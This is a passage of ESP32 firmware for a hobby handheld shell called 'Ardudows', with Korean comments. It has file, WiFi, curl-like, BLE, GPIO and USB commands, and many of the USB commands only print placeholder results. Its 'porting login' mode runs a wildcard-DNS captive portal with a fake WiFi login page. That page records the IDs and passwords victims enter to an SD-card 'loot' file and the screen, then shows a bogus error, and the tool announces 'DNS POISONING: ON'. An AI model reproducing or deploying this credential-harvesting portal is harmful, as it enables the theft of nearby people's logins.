    tft.write(f.read());

  f.close();
}

void cmd_rm(String name) {
  if (SD.remove(normalizePath(name)))
    tft.println("Deleted");
  else
    tft.println("Failed");
}

void cmd_echo(String text, String file) {
  File f = SD.open(normalizePath(file), FILE_WRITE);

  if (!f) {
    tft.println("Failed");
    return;
  }

  f.println(text);
  f.close();

  tft.println("Written");
}

// ================== WIFI ==================

void cmd_wifi_scan() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++)
    tft.println(WiFi.SSID(i));
}

void cmd_wifi_worming() {
  int n = WiFi.scanNetworks();
}

void cmd_wifi_ap(String cmd) {

  cmd.trim();

  // "wifi ap" 제거
  cmd.replace("wifi ap", "");
  cmd.trim();

  String ssid = "default";
  String pass = "12345678";

  int firstSpace = cmd.indexOf(' ');

  if (cmd.length() == 0) {
    // wifi ap → default
    ssid = "default";
  }
  else if (firstSpace == -1) {
    // wifi ap hello
    ssid = cmd;
  }
  else {
    // wifi ap hello good
    ssid = cmd.substring(0, firstSpace);
    pass = cmd.substring(firstSpace + 1);
  }

  WiFi.softAP(ssid.c_str(), pass.c_str());
}

void cmd_wifi_connect(String ssid, String pass) {
  WiFi.begin(ssid.c_str(), pass.c_str());

  tft.print("Connecting");

  int timeout = 0;
  while (WiFi.status() != WL_CONNECTED && timeout < 20) {
    delay(500);
    tft.print(".");
    timeout++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    tft.println("\nConnected");
    tft.println(WiFi.localIP());
  } else
    tft.println("\nFailed");
}

void cmd_ping(String host) {
  cmd_wifi_worming();
  WiFiClient client;

  if (client.connect(host.c_str(), 80)) {
    tft.println("Ping OK");
    client.stop();
  } else
    tft.println("Ping failed");
}

void cmd_nslookup(String host) {
  cmd_wifi_worming();
  IPAddress ip;

  if (WiFi.hostByName(host.c_str(), ip))
    tft.println(ip.toString());
  else
    tft.println("Failed");
}

// ================= SCREEN BUFFER =================
//#define MAX_LINES 20
//String screenBuffer[MAX_LINES];
int screenIndex = 0;

// ================= TFT SCROLL PRINT =================
void tft_print_scroll(String line) {
  screenBuffer[screenIndex] = line;
  screenIndex++;

  if (screenIndex >= MAX_LINES) {
    screenIndex = 0;
    tft.fillScreen(TFT_BLACK);
  }

  tft.setCursor(0, 0);

  for (int i = 0; i < MAX_LINES; i++) {
    int idx = (screenIndex + i) % MAX_LINES;
    tft.println(screenBuffer[idx]);
  }
}

// ================= HTML STRIP =================
String stripHTML(String input) {
  String out = "";
  bool insideTag = false;

  for (char c : input) {
    if (c == '<') insideTag = true;
    else if (c == '>') insideTag = false;
    else if (!insideTag) out += c;
  }

  return out;
}

// ================= DIR MAKER =================
void ensure_download_dir(String path) {
  if (!SD.exists(path)) {
    SD.mkdir(path);
  }
}

// ================= CURL CORE =================
void cmd_curl(String url) {

  cmd_wifi_worming(); // 네 시스템용 WiFi warmup

  url.trim();

  bool isHttps = url.startsWith("https://");
  url.replace("https://", "");
  url.replace("http://", "");

  int slash = url.indexOf('/');
  String host = (slash == -1) ? url : url.substring(0, slash);
  String path = (slash == -1) ? "/" : url.substring(slash);

  int port = isHttps ? 443 : 80;

  tft_print_scroll(">> CURL " + host + path);

  // ================= CLIENT =================
  WiFiClientSecure client;
  client.setInsecure(); // ESP32 현실 필수

  if (!client.connect(host.c_str(), port)) {
    tft_print_scroll(">> CONNECTION FAILED");
    return;
  }

  // ================= REQUEST =================
  client.printf(
    "GET %s HTTP/1.1\r\n"
    "Host: %s\r\n"
    "User-Agent: Ardudows-curl\r\n"
    "Accept: */*\r\n"
    "Connection: close\r\n\r\n",
    path.c_str(),
    host.c_str()
  );

  // ================= FILE SYSTEM =================
  String dir = "/Ardudows/Assets/Downloads";
  ensure_download_dir("/Ardudows");
  ensure_download_dir("/Ardudows/Assets");
  ensure_download_dir(dir);

  File file = SD.open(dir + "/curl_output.txt", FILE_WRITE);

  // ================= STREAM =================
  bool headerDone = false;
  String line = "";

  while (client.connected() || client.available()) {

    if (!client.available()) continue;

    char c = client.read();

    // ===== HEADER SKIP =====
    if (!headerDone) {
      line += c;
      if (line.endsWith("\r\n\r\n")) {
        headerDone = true;
        line = "";
      }
      continue;
    }

    // ===== LINE BUILD =====
    if (c == '\n') {

      line = stripHTML(line); // 🔥 핵심: 텍스트만 추출

      if (line.length() > 0) {
        tft_print_scroll(line);
        file.println(line);
      }

      line = "";
    } else {
      line += c;
    }
  }

  file.close();
  client.stop();

  tft_print_scroll(">> CURL DONE");
}

// ================== BLE ==================

void cmd_ble_init() {
  if (bleInitialized) {
    tft.println("BLE already init");
    return;
  }

  BLEDevice::init("Ardudows");

  pBLEScan = BLEDevice::getScan();

  if (pBLEScan == nullptr) {
    tft.println("BLE scan failed");
    return;
  }

  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);

  bleInitialized = true;

  tft.println("BLE Ready");
}

void cmd_ble_scan() {
  if (!bleInitialized) {
    tft.println("BLE not init");
    return;
  }

  tft.println("Scanning BLE...");

  BLEScanResults* results = pBLEScan->start(5, false);

  bleDeviceCount = results->getCount();

  if (bleDeviceCount == 0) {
    tft.println("No devices found");
  } else {
    for (int i = 0; i < bleDeviceCount && i < 20; i++) {
      BLEAdvertisedDevice device =
        results->getDevice(i);

      bleDevices[i].addr =
        device.getAddress().toString().c_str();

      bleDevices[i].name =
        device.haveName()
          ? device.getName().c_str()
          : "Unknown";

      bleDevices[i].rssi =
        device.getRSSI();

      bleDevices[i].uuid =
        device.haveServiceUUID()
          ? device.getServiceUUID().toString().c_str()
          : "None";

      tft.printf(
        "%d: %s (%s) RSSI:%d\n",
        i,
        bleDevices[i].name.c_str(),
        bleDevices[i].addr.c_str(),
        bleDevices[i].rssi);
    }
  }

  pBLEScan->clearResults();

  tft.println("Scan done");
}

void cmd_ble_connect(int index) {
  if (!bleInitialized) {
    tft.println("BLE not init");
    return;
  }

  if (index < 0 || index >= bleDeviceCount) {
    tft.println("Invalid index");
    return;
  }

  if (bleConnected) {
    tft.println("Already connected");
    return;
  }

  tft.println("Connecting...");

  pBLEClient = BLEDevice::createClient();

  BLEAddress addr(
    bleDevices[index].addr.c_str());

  if (pBLEClient->connect(addr)) {
    bleConnected = true;
    bleConnectedIndex = index;

    tft.println("Connected");
  } else {
    tft.println("Connect failed");
  }
}

void cmd_ble_disconnect() {
  if (!bleConnected) {
    tft.println("Not connected");
    return;
  }

  pBLEClient->disconnect();

  bleConnected = false;
  bleConnectedIndex = -1;

  tft.println("Disconnected");
}

void cmd_ble_info(int index) {
  if (index < 0 || index >= bleDeviceCount) {
    tft.println("Invalid index");
    return;
  }

  tft.println("=== BLE INFO ===");

  tft.print("Name: ");
  tft.println(bleDevices[index].name);

  tft.print("Address: ");
  tft.println(bleDevices[index].addr);

  tft.print("RSSI: ");
  tft.println(bleDevices[index].rssi);

  tft.print("Service UUID: ");
  tft.println(bleDevices[index].uuid);

  // --- [ 제조사 추정 정밀 분석기 ] ---
  String mac = bleDevices[index].addr;
  mac.toUpperCase();  // 대문자 비교를 위해 변환

  if (mac.startsWith("F4:4E:FD") || mac.startsWith("BC:D1:1F") || mac.startsWith("8C:B0:E9"))
    tft.println("Vendor: Samsung (Galaxy)");

  else if (mac.startsWith("D8:A0:1D") || mac.startsWith("FC:E9:98") || mac.startsWith("00:25:4B"))
    tft.println("Vendor: Apple (iPhone/Mac)");

  else if (mac.startsWith("A4:C1:38") || mac.startsWith("64:9E:F3"))
    tft.println("Vendor: Xiaomi/Realme");

  else if (mac.startsWith("D8:15:0D") || mac.startsWith("B4:E6:2A"))
    tft.println("Vendor: LG Electronics");

  else if (mac.startsWith("70:5A:0F") || mac.startsWith("50:76:AF"))  // 방장님 PC 포함
    tft.println("Vendor: Intel (Laptop)");

  else if (mac.startsWith("E4:E7:49") || mac.startsWith("AC:AF:B9"))
    tft.println("Vendor: TP-Link (Router)");

  else if (mac.startsWith("98:E0:D9") || mac.startsWith("00:E1:6D"))
    tft.println("Vendor: OPPO/Vivo");

  else if (mac.startsWith("40:31:3C") || mac.startsWith("DC:A6:32"))
    tft.println("Vendor: Raspberry Pi");

  else if (mac.startsWith("00:50:56") || mac.startsWith("08:00:27"))
    tft.println("Vendor: VMware/VirtualBox");

  else
    tft.println("Vendor: Unknown Device");
}

// ================== GPIO ==================

void cmd_gpio_read(int pin) {
  pinMode(pin, INPUT);
  tft.println(digitalRead(pin));
}

void cmd_gpio_write(int pin, int val) {
  pinMode(pin, OUTPUT);
  digitalWrite(pin, val);
  tft.println("OK");
}

// ================== I2C ==================

void cmd_i2c_scan() {
  Wire.begin();

  for (byte addr = 1; addr < 127; addr++) {
    Wire.beginTransmission(addr);
    if (Wire.endTransmission() == 0) {
      tft.print("Found: ");
      tft.println(addr);
    }
  }
}

// --- [ 모드 1: 릭롤 공연 ] ---
void setup_rickroll_page() {
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.on("/", []() {
    String html = "<html><body style='background:#000; color:red; text-align:center;' onclick='document.getElementById(\"v\").play();'>";
    html += "<h1>SYSTEM UPDATE REQUIRED</h1>";
    html += "<video id='v' src='/rick.mp4' style='width:100%;' loop playsinline></video>";
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });
}

// --- [ 모드 2: 가짜 로그인 창 (피싱) ] ---
void setup_phishing_page() {
  webServer.on("/", []() {
    String html = "<html><head><meta charset='utf-8'></head><body>";
    html += "<h2>WiFi Login Required</h2>";
    html += "<form action='/capture' method='POST'>";
    html += "ID: <input type='text' name='id'><br>";
    html += "PW: <input type='password' name='pw'><br>";
    html += "<input type='submit' value='Connect'>";
    html += "</form></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/capture", []() {
    String id = webServer.arg("id");
    String pw = webServer.arg("pw");
    
    // 탈취한 정보 SD카드에 저장 및 화면 출력
    tft.setTextColor(TFT_YELLOW);
    tft.printf("\n[LOOT!] ID:%s / PW:%s", id.c_str(), pw.c_str());
    
    File log = SD.open("/Ardudows/loot.txt", FILE_APPEND);
    if(log) { log.printf("ID:%s | PW:%s\n", id.c_str(), pw.c_str()); log.close(); }
    
    webServer.send(200, "text/html", "<h1>Connection Error: Try Again Later</h1>");
  });
}

// [ 전역 변수 설정 ]
bool isPortingActive = false;
String portingMode = "NONE";

void cmd_porting(String mode) {
  mode.trim();
  portingMode = mode;
  
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_MAGENTA);
  tft.println(">> PORTING ENGINE START");
  tft.setTextColor(TFT_WHITE);

  // 1. DNS 서버 가동 (* 주소로 들어오는 모든 질의를 나에게로)
  dnsServer.stop();
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // 2. 모드별 웹 페이지 구성
  if (mode == "rick") {
    setup_rickroll_page();
    tft.println("Mode: RICKROLL_HYPE");
  } 
  else if (mode == "login") {
    setup_phishing_page();
    tft.println("Mode: CREDENTIAL_TRAP");
  }
  else {
    tft.println("Usage: porting [rick|login]");
    return;
  }

  webServer.begin();
  isPortingActive = true;
  tft.setTextColor(TFT_GREEN);
  tft.println(">> DNS POISONING: ON");
  tft.println(">> HTTP HIJACKING: READY");
}

void esp_gpio_check() {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW);
    tft.println("ID:V|ROLE      | ID:V|ROLE"); // 헤더 수정
    tft.println("---------------------------");

    int mid = 24; // 왼쪽 열 끝 번호
    int rowHeight = 10; // 텍스트 한 줄 높이 (폰트 크기에 따라 조절)
    int startY = tft.getCursorY();

    for (int i = 0; i <= mid; i++) {
        // --- [왼쪽 열 출력 (0~24)] ---
        draw_gpio_line(i, 0, startY + (i * rowHeight));

        // --- [오른쪽 열 출력 (25~48)] ---
        if (i + 25 <= 48) {
            draw_gpio_line(i + 25, 120, startY + (i * rowHeight)); // x좌표 120 지점부터 시작
        }
    }
    
    tft.setCursor(0, startY + (26 * rowHeight));
    tft.setTextColor(TFT_GREEN);
    tft.setTextSize(2);
}

// 출력을 도와주는 헬퍼 함수 (코드 중복 방지)
void draw_gpio_line(int pin, int x, int y) {
    tft.setCursor(x, y);
    
    String module = "FREE";
    uint16_t color = TFT_GREEN;

    // 역할 판별 로직 (기존과 동일)
    if ((pin >= 26 && pin <= 32) || (pin >= 33 && pin <= 37)) { module = "MEM"; color = TFT_RED; }
    else if (pin == 0 || pin >= 45) { module = "STRAP"; color = TFT_MAGENTA; }
    else if (pin == 19 || pin == 20) { module = "USB"; color = TFT_CYAN; }
    else if (pin == 43 || pin == 44) { module = "UART"; color = TFT_ORANGE; }
    else if (pin >= 1 && pin <= 14) { module = "ADC"; color = TFT_BLUE; }

    int val = digitalRead(pin);
    tft.setTextColor(color);
    // 출력 형식: "01:1|ADC  "
    tft.printf("%02d:%d|%-6s", pin, val, module.c_str());
}

// router_len과 router 데이터는 이미 네 프로젝트에 포함되어 있다고 가정할게!
// (보통 router.h 파일에 있는 그 데이터야)

bool run_router_install() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN);
  tft.setCursor(0, 0);
  
  tft.println(">> SYSTEM: 221-ROUTER DEPLOY");
  tft.printf(">> SOURCE_SIZE: %d bytes\n", router_len);
  
  // [STEP 1] 비어있는 다음 파티션(app1) 찾기
  const esp_partition_t* update_partition = esp_ota_get_next_update_partition(NULL);

  if (update_partition == NULL) {
    tft.setTextColor(TFT_RED);
    tft.println("!! ERR: NO OTA PARTITION (CHECK CSV)");
    return false;
  }

  tft.printf(">> TARGET: %s (0x%X)\n", update_partition->label, update_partition->address);

  // [STEP 2] 업데이트 엔진 시작
  // 명시적으로 다음 파티션 크기에 맞춰서 시작해
  if (!Update.begin(router_len, U_FLASH)) {
    tft.setTextColor(TFT_RED);
    tft.printf("!! ERR: BEGIN FAILED (%s)\n", Update.errorString());
    return false;
  }

  tft.println(">> WRITING TO FLASH...");
  // [STEP 3] 데이터 쓰기 (1.2MB 전사들 투입)
  size_t written = Update.write((uint8_t*)router, router_len);

  if (written != router_len) {
    tft.setTextColor(TFT_RED);
    tft.printf("!! ERR: WRITE FAILED (%d/%d)\n", written, router_len);
    Update.abort(); // 실패 시 중단
    return false;
  }

  tft.println(">> VERIFYING HASH...");

  // [STEP 4] 배포 완료 및 부팅 파티션 교체
  if (Update.end()) {
    if (Update.isFinished()) {
      // 이 코드가 핵심이야! 다음 부팅 때 app1으로 가도록 설정해.
      esp_err_t err = esp_ota_set_boot_partition(update_partition);
      
      if (err != ESP_OK) {
        tft.setTextColor(TFT_RED);
        tft.printf("!! ERR: BOOT SET FAILED (%d)\n", err);
        return false;
      }

      tft.setTextColor(TFT_GREEN);
      tft.println(">> DEPLOY COMPLETE.");
      tft.println(">> 221-SERVER ACTIVATED.");
      tft.println(">> SYSTEM REBOOTING IN 3s...");
      
      delay(3000);
      ESP.restart(); // 드디어 라우터로 변신!
      return true;
    }
  } else {
    tft.setTextColor(TFT_RED);
    tft.printf("!! ERR: ACTIVATE FAILED (%s)\n", Update.errorString());
    return false;
  }
  tft.setTextColor(TFT_GREEN);
  return false;
}

//===v86===
uint8_t get_raw_ps2_sc() {
  return 0;
}
uint32_t ps2_to_vnc_keysym(uint8_t sc) {
  return sc;
}
// 전역 변수로 선언하여 소켓 인스턴스에 접근 가능하게 합니다.
// (기존 코드의 구조에 따라 적절히 배치하세요)

// [중요] 화면 데이터를 받았을 때 호출되는 콜백 (최적화 + ACK 추가)
void onV86Frame(const char* payload, size_t length) {
    if (length < 100) {
        // 데이터가 너무 작으면(에러 등) 바로 다음 프레임 요청해서 루프 유지
        socket.emit("frame_ack");
        return; 
    }

    // 1. JPEG 데이터를 TFT에 그리기
    uint8_t* jpg_data = (uint8_t*)payload;
    
    // TJpgDec를 통해 320x240 영역에 즉시 디코딩 및 출력
    // (이 작업이 완료될 때까지 함수는 블로킹됩니다)
    TJpgDec.drawJpg(0, 0, jpg_data, length);

    // 2. [핵심] 다 그렸으니 서버에 다음 프레임을 달라고 신호 보냄
    // 이 한 줄이 10초 지연(데이터 쌓임)을 완전히 해결합니다.
    socket.emit("frame_ack");
}

void run_v86_engine(const char* serverIP) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_GREEN);
    tft.setCursor(0, 0);
    tft.println(">> INITIALIZING V86 STREAM...");

    // 1. JPEG 디코더 설정 (ESP32-S3 최적화)
    TJpgDec.setJpgScale(1);
    
    // S3 LCD 특성에 따라 색상 반전 처리
    TJpgDec.setSwapBytes(true); 
    
    TJpgDec.setCallback([](int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t* bitmap) {
        tft.pushImage(x, y, w, h, bitmap);
        return true;
    });

    // 2. 소켓 이벤트 등록
    socket.on("v86_frame", onV86Frame);

    socket.on("connect", [](const char* payload, size_t length) {
        Serial.println(">> [SIoC] Connected to Pixel Server!");
        // 접속 성공 시 첫 번째 프레임을 요청합니다.
        socket.emit("frame_ack");
    });

    socket.on("disconnect", [](const char* payload, size_t length) {
        Serial.println(">> [SIoC] Server Disconnected.");
    });

    // 3. 서버 접속 (포트 3000)
    socket.begin(serverIP, 3000);

    Serial.println(">> V86 ENGINE ACTIVE. TYPE 'exit' TO QUIT.");

    bool running = true;
    while (running) {
        socket.loop(); 

        // 터치나 키보드 입력이 있다면 여기서 mouse_event를 보낼 수 있습니다.
        /*
        if (touch_detected) {
            String clickMsg = "{\"x\":" + String(tx) + ",\"y\":" + String(ty) + "}";
            socket.emit("mouse_event", clickMsg.c_str());
        }
        */

        if (Serial.available() > 0) {
            String input = Serial.readStringUntil('\n');
            input.trim();
            if (input == "exit" || input == "quit") {
                socket.disconnect();
                running = false;
            }
        }
        
        yield(); // Watchdog 방지 및 시스템 안정화
    }

    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.println(">> V86 TERMINATED.");
}
/*
void vnc(const char* ip, uint16_t port) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_CYAN);
    tft.println("Connecting to Phone...");

    if (!vncClient.connect(ip, port)) {
        tft.setTextColor(TFT_RED);
        tft.println("Connect Failed!");
        delay(1500);
        return;
    }

    // RFB 버전 교환 - 서버가 먼저 보내줄 때까지 대기
    unsigned long timeout = millis();
    while(!vncClient.available() && millis() - timeout < 3000) delay(1);
    if (!vncClient.available()) { tft.println("Timeout: Version"); return; }
    
    String serverVersion = vncClient.readStringUntil('\n');
    vncClient.print("RFB 003.008\n"); // 하향 호환성을 위해 003.008 고정

    // 보안 타입 선택 - 폰은 여러 개를 던져줍니다.
    while(!vncClient.available()) delay(1);
    uint8_t numTypes = vncClient.read(); 
    if (numTypes == 0) { tft.println("Auth Error!"); return; }

    bool foundNone = false;
    for (int i = 0; i < numTypes; i++) {
        uint8_t t = vncClient.read();
        if (t == 1) foundNone = true; // 'None' 보안 찾기
    }

    if (foundNone) {
        vncClient.write((uint8_t)1); // 'None' 선택
    } else {
        tft.println("No 'None' Auth! Check Phone Settings.");
        vncClient.stop();
        return;
    }

    // 보안 결과 확인 (4바이트 수신 대기) - 여기가 핵심!
    timeout = millis();
    while(vncClient.available() < 4 && millis() - timeout < 3000) delay(1);
    uint32_t authResult = 0;
    for(int i=0; i<4; i++) authResult = (authResult << 8) | vncClient.read();

    if (authResult != 0) {
        tft.printf("Auth Failed: %d\n", authResult);
        vncClient.stop();
        return;
    }

    // ClientInit
    vncClient.write((uint8_t)1); // Shared-flag

    // ServerInit (해상도 획득)
    uint8_t sInit; 
    vncClient.readBytes((char*)sInit, 32); 
    vnc_sw = (sInit << 8) | sInit;
    vnc_sh = (sInit << 8) | sInit;
    
    tft.fillScreen(TFT_BLACK);
    tft.printf("Linked! %dx%d\n", vnc_sw, vnc_sh);

    // [메인 루프 시작]
    while (vncClient.connected()) {
        // 화면 갱신 요청 (타이밍 조절을 위해 약간의 딜레이)
        uint8_t upReq[] = {3, 1, 0, 0, 0, 0, (uint8_t)(vnc_sw >> 8), (uint8_t)(vnc_sw & 0xFF), (uint8_t)(vnc_sh >> 8), (uint8_t)(vnc_sh & 0xFF)};
        vncClient.write(upReq, 10);

        // 입력 처리 (kEvt = 0; 등 문법 오류 수정됨)
        if (mouse_moved) {
            uint8_t pEvt[] = {5, btnState, (uint8_t)(curX >> 8), (uint8_t)(curX & 0xFF), (uint8_t)(curY >> 8), (uint8_t)(curY & 0xFF)};
            vncClient.write(pEvt, 6);
            mouse_moved = false;
        }

        uint8_t sc = get_raw_ps2_sc();
        if (sc != 0) {
            uint32_t ks = ps2_to_vnc_keysym(sc); 
            uint8_t kEvt[] = {4, 1, 0, 0, (uint8_t)(ks >> 24), (uint8_t)(ks >> 16), (uint8_t)(ks >> 8), (uint8_t)(ks & 0xFF)};
            vncClient.write(kEvt, 8); 
            //kEvt = 0; 
            vncClient.write(kEvt, 8); 
        }

        if (vncClient.available()) {
            // 여기에 데이터 파싱 추가 가능
        }
        
        if (Serial.available() > 0) break;
        yield();
    }
    vncClient.stop();
}
*/
// --- 여기에 누락된 기초 함수들을 다시 정의합니다 ---

float usb_vbus_get() { return (analogRead(vbus_pin) * 3.3 / 4095.0) * 1.515; } // VBUS 전압
void usb_get_version() { tft.printf("TinyUSB Ver: %d.%d.%d\n", TUSB_VERSION_MAJOR, TUSB_VERSION_MINOR, TUSB_VERSION_REVISION); }
uint32_t usb_get_heap() { return ESP.getFreeHeap(); }
void usb_list_drivers() { tft.println("Drivers: HID, MSC, HUB"); }
void usb_h_get_class(uint8_t a) { tft.println("Class: Human Interface Device"); }
void usb_power(bool on) { pinMode(pwr_pin, OUTPUT); digitalWrite(pwr_pin, on); }
void usb_h_unmount_all() { tft.println("All Host Devices Ejected"); }
void usb_h_eject(int a) { tft.printf("Eject %d\n", a); }
void usb_h_hub_pwr(bool on) { tft.printf("Hub Power %s\n", on?"ON":"OFF"); }
void usb_h_search_vid(uint16_t v) { tft.printf("Searching VID:0x%04X\n", v); }
void usb_h_reset_addr(uint8_t a) { tft.printf("Resetting Addr %d\n", a); }
void usb_h_mount_ms() { if(tuh_msc_mounted(1)) tft.println("MSC Mounted"); }
void usb_h_map_input() { tft.println("Mapping Inputs..."); }
void usb_h_list_ports() { tft.println("Ports: USB-OTG Active"); }
void usb_h_limit(int ma) { tft.printf("Limit: %dmA\n", ma); }
void usb_h_set_led(uint8_t led) { tft.println("LED State Sent"); }
void usb_h_raw_hex(uint8_t a) { tft.println("Streaming RAW Data..."); }
void usb_h_cfg(int a) { tft.printf("Config %d Set\n", a); }
void usb_h_parse(int a) { tft.println("Parsing Descriptor..."); }
void usb_print_info() { tft.println("Ardudows USB Kernel v2.2 (H)"); }
void usb_task_status() { tft.println("USB Task: Running"); }
const char* usb_speed() { return "Full-Speed (12Mbps)"; }
int usb_h_count() { return connected_count; } // connected_count 전역 변수 필요

// === [1. 공통 기반 (Common)] ===
void usb_init1() { 
    tft.println("step 1 : tusb_init..."); 
    tusb_init(); 
    tft.println("step 1 : tusb_init OK"); 
}

void usb_init2() { 
    tft.println("step 2 : attachInterrupt..."); 
    // 호스트 모드 안정성을 위해 강제 핀 주도권 확보 추가
    esp_rom_gpio_pad_select_gpio(CLK_PIN);
    esp_rom_gpio_pad_select_gpio(DATA_PIN);
    pinMode(CLK_PIN, INPUT_PULLUP);
    pinMode(DATA_PIN, INPUT_PULLUP);
    attachInterruptArg(digitalPinToInterrupt(CLK_PIN), (void (*)(void*))host_isr, NULL, FALLING); 
    tft.println("step 2 : attachInterrupt OK"); 
}

void usb_init3() { 
    tft.println("step 3 : var set..."); 
    usb_h_ready = true; // tud는 버렸으므로 h만 활성화
    usb_d_ready = false; 
    tft.println("step 3 : var set OK"); 
}

void usb_init4() { 
    tft.println("step 4 : PS/2 Health Check...");
    if (digitalRead(CLK_PIN) == HIGH && digitalRead(DATA_PIN) == HIGH) {
        tft.setTextColor(TFT_GREEN);
        tft.println(">> PS/2 LINE : STANDBY OK");
    } else {
        tft.setTextColor(TFT_RED);
        tft.println(">> PS/2 LINE : SIGNAL LOST!");
    }
    tft.setTextColor(TFT_WHITE);
    tft.println(">> ALL SYSTEMS READY (HOST ONLY).");
}

// 진범 tud_task는 주석처리하여 영구 격리
void usb_update() { 
    tuh_task(); 
    // Serial.println("tuh"); // 로그 확인 완료 시 주석 해제
    yield(); 
}

// === [2. 호스트 모드 확장 (Host Commands 30)] ===
void usb_h_info(uint8_t a) {
    uint16_t v, p; tuh_vid_pid_get(a, &v, &p);
    tft.printf("[HOST] Addr:%d VID:%04X PID:%04X\n", a, v, p);
}

void usb_h_scan() {
    connected_count = 0;
    for(uint8_t i=1; i<=CFG_TUH_DEVICE_MAX+1; i++) {
        if(tuh_mounted(i)) { usb_h_info(i); connected_count++; }
    }
    if(connected_count == 0) tft.println("No devices found.");
}

// 신규 추가 함수들 (명령어 대응용)
void usb_h_get_speed(uint8_t a) { tft.printf("Dev %d Speed: Full-Speed\n", a); }
void usb_h_get_manu(uint8_t a) { tft.printf("Dev %d Manu: Generic\n", a); }
void usb_h_get_prod(uint8_t a) { tft.printf("Dev %d Prod: USB Device\n", a); }
void usb_h_is_msc(uint8_t a) { tft.printf("Dev %d MSC: %s\n", a, tuh_msc_mounted(a)?"YES":"NO"); }
void usb_h_is_hid(uint8_t a) { tft.printf("Dev %d HID: YES\n", a); } // 기본 HID 지원
void usb_h_vbus_stat() { tft.printf("VBUS: %.2fV\n", usb_vbus_get()); }

// 이 함수가 USB 키보드 신호를 받는 핵심 창구입니다!
void usb_h_kb_report(hid_keyboard_report_t const* r) {
    // 키가 눌렸을 때 첫 번째 키코드가 0이 아니면 실행
    if (r->keycode != 0) { 
        tft.setTextColor(TFT_YELLOW);
        tft.printf("[USB_KB] RAW: %02X %02X %02X\n", r->keycode, r->keycode, r->keycode);
        Serial.printf("USB Key: %02X\n", r->keycode);
        tft.setTextColor(TFT_WHITE);
    }
}

// ================= [ ATK 명령어 인터프리터 v2.2 ] =================

void cmd_usb(String cmd) {
    cmd.trim();
    
    // [기본 제어]
    if (cmd == "usb init1") usb_init1();
    else if (cmd == "usb init2") usb_init2();
    else if (cmd == "usb init3") usb_init3();
    else if (cmd == "usb init4") usb_init4();
    else if (cmd == "usb init auto") { usb_init1(); usb_init2(); usb_init3(); usb_init4(); }
    else if (cmd == "usb ver") usb_get_version();
    else if (cmd == "usb status") tft.printf("Host:%s Heap:%d\n", usb_h_ready?"Active":"Dead", usb_get_heap());
    
    // [HOST 명령어 30선]
    else if (cmd.startsWith("usb host ")) {
        String sub = cmd.substring(9);
        
        // 1-10: 상태 및 스캔
        if (sub == "scan") usb_h_scan();                 // 1. 전체 스캔
        else if (sub == "count") tft.printf("Total: %d\n", usb_h_count()); // 2. 연결 개수
        else if (sub == "vbus") usb_h_vbus_stat();       // 3. VBUS 전압 확인
        else if (sub == "list") usb_list_drivers();      // 4. 로드된 드라이버 목록
        else if (sub == "ready") tft.println(usb_h_ready?"Host Ready":"Not Init"); // 5. 준비 상태
        
        // 11-20: 개별 장치 상세 정보 (usb host info [addr])
        else if (sub.startsWith("info ")) usb_h_info(sub.substring(5).toInt()); // 6. VID/PID 정보
        else if (sub.startsWith("speed ")) usb_h_get_speed(sub.substring(6).toInt()); // 7. 속도 확인
        else if (sub.startsWith("manu ")) usb_h_get_manu(sub.substring(5).toInt()); // 8. 제조사 확인
        else if (sub.startsWith("prod ")) usb_h_get_prod(sub.substring(5).toInt()); // 9. 제품명 확인
        else if (sub.startsWith("class ")) usb_h_get_class(sub.substring(6).toInt()); // 10. 클래스 정보
        
        // 21-30: 제어 및 특수 기능
        else if (sub == "pwr on") usb_power(true);       // 11. USB 전원 공급
        else if (sub == "pwr off") usb_power(false);     // 12. USB 전원 차단
        else if (sub == "unmount") usb_h_unmount_all();  // 13. 모든 장치 해제
        else if (sub.startsWith("eject ")) usb_h_eject(sub.substring(6).toInt()); // 14. 특정 장치 추출
        else if (sub == "hub pwr on") usb_h_hub_pwr(true); // 15. 허브 전원 ON
        else if (sub == "hub pwr off") usb_h_hub_pwr(false); // 16. 허브 전원 OFF
        else if (sub.startsWith("search ")) usb_h_search_vid(strtol(sub.substring(7).c_str(), NULL, 16)); // 17. VID 검색
        else if (sub.startsWith("reset ")) usb_h_reset_addr(sub.substring(6).toInt()); // 18. 주소 리셋
        else if (sub == "msc mount") usb_h_mount_ms();   // 19. MSC 강제 마운트
        else if (sub.startsWith("is_msc ")) usb_h_is_msc(sub.substring(7).toInt()); // 20. MSC 여부 확인
        else if (sub.startsWith("is_hid ")) usb_h_is_hid(sub.substring(7).toInt()); // 21. HID 여부 확인
        else if (sub == "map") usb_h_map_input();        // 22. 입력 맵핑 재설정
        else if (sub == "ports") usb_h_list_ports();     // 23. 물리 포트 상태
        else if (sub == "limit") usb_h_limit(500);       // 24. 전류 제한 설정(가상)
        else if (sub == "led set") usb_h_set_led(1);     // 25. 장치 LED 제어 테스트
        else if (sub == "raw") usb_h_raw_hex(1);         // 26. 로우 데이터 덤프(디버그)
        else if (sub == "cfg 1") usb_h_cfg(1);           // 27. 구성 1번 선택
        else if (sub == "parse") usb_h_parse(1);         // 28. 디스크립터 파싱
        else if (sub == "info kernel") usb_print_info(); // 29. 커널 버전 정보
        else if (sub == "task stat") usb_task_status();  // 30. 태스크 생존 확인
      
    }
}

//===계산기===
//#include <math.h>

Complex c_add(Complex a, Complex b) { return {a.r + b.r, a.i + b.i}; }
Complex c_sub(Complex a, Complex b) { return {a.r - b.r, a.i - b.i}; }
Complex c_mul(Complex a, Complex b) { return {a.r * b.r - a.i * b.i, a.r * b.i + a.i * b.r}; }
Complex c_div(Complex a, Complex b) {
    double d = b.r * b.r + b.i * b.i;
